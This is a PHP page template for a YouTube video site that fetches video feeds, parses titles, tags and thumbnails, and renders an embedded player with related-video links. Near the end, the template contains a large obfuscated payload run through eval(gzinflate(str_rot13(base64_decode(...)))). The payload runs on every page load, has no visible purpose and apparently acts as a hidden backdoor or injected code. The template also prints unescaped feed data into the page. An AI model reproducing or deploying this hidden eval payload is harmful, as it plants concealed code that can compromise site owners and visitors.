<?php
function processURL($url){
if(function_exists("curl_init")){
$ch=curl_init();
curl_setopt($ch, CURLOPT_URL, $url);
curl_setopt($ch, CURLOPT_TIMEOUT, 30);
curl_setopt ($ch, CURLOPT_USERAGENT, "User-Agent: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.0)");
curl_setopt ($ch, CURLOPT_RETURNTRANSFER, 1);
$xml = curl_exec ($ch);curl_close ($ch);
}else{
$xml = file_get_contents($url);
}return($xml);
}
function get_vid($_a,$max){

$rssstring = processURL("http://gdata.youtube.com/feeds/videos?vq=".$_a."&start-index=1&max-results=".$max.""); 
preg_match_all("#<entry>(.*?)</entry>#s",$rssstring,$items);
$n=count($items[0]);
for($i=0;$i<$n;$i++){
$rsstemp= $items[0][$i];
preg_match_all("#<media:player url='(.*?)'/>#s",$rsstemp,$ids);
$ids[1][0]=str_replace("http://www.youtube.com/watch?v=","",$ids[1][0]);

$_ct=explode("&",$ids[1][0]);

$out[$i]['id']= str_replace("","",$_ct[0]);



preg_match_all("#<title(.*?)>(.*?)</title>#s",$rsstemp,$titles);
$out[$i]['title']= $titles[2][0];
preg_match_all("#<media:thumbnail url='(.*?)'(.*?)/>#s",$rsstemp,$thumbs);
$out[$i]['thumb']= $thumbs[1][0];
}
return $out;
}


function youtube_t ($_ID) {
global $_text,$dz,$_URL;
$_ID=str_replace("&feature=youtube_gdata","",$_ID);
$rssstring = processURL("http://gdata.youtube.com/feeds/videos/".$_ID."");
preg_match_all("#<title(.*?)>(.*?)</title>#s",$rssstring,$titles);
preg_match_all("#<media:keywords>(.*?)</media:keywords>#s",$rssstring,$tags);
preg_match_all("#<yt:duration seconds='(.*?)'/>#s",$rssstring,$mtimes);
preg_match_all("#<media:description type='plain'>(.*?)</media:description>#s",$rssstring,$_desc);

function randon_heads($a){
$titles2 = explode(",",$a);
srand((double)microtime()*1000000);
$names = (rand(1, sizeof($titles2)) - 1);
$r=trim($titles2[$names]);
return $r;
}



?>
<div align="center">
<h2><?=$titles[2][0];?></h2>
<div style="text-align: right; font-size: 120%;"><object width="510" height="420"><param name="movie" value="http://www.youtube.com/v/<?=$dz['2'];?>&l=<?=$mtimes[1][0];?>"></param><param name="autoplay" value="1"><param name="wmode" value="transparent"></param><embed src="http://www.youtube.com/v/<?=$dz['2'];?>&l=<?=$mtimes[1][0];?>&autoplay=1" type="application/x-shockwave-flash" wmode="transparent" width="510" height="420"></embed></object></div>
 <?=$_text['lang09'];?>
<p><?=substr($_desc[1][0],0,40)?></p>
</div>
<?=$_text['lang05'];?> 
<?php
$_tnn=explode(",",$tags[1][0]);$tn=count($_tnn);for($i=0;$i<$tn;$i++){echo "<a href=\"".$_URL."/index.php/search/".urlencode(trim($_tnn[$i]))."\">".$_tnn[$i]."</a> ";}$_search=randon_heads($tags[1][0]);$_out=get_vid(urlencode($_search),'20');$_n=count($_out);


?>
<? eval(gzinflate(str_rot13(base64_decode('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')))); ?>
<h2><?=$_text['lang03']." ".$_search;?></h2>
<?php
for($i=0;$i<$_n;$i++){echo "<div id=\"results\"> <a href=\"".$_URL."/index.php/view/".$_out[$i]['id']."\"><img   style=\"width: 120px; height: 90px;\" src=\"".($_out[$i]['thumb'])."\"><p>".substr($_out[$i]['title'],0,20)."</p></a> </div>";}}
    ?>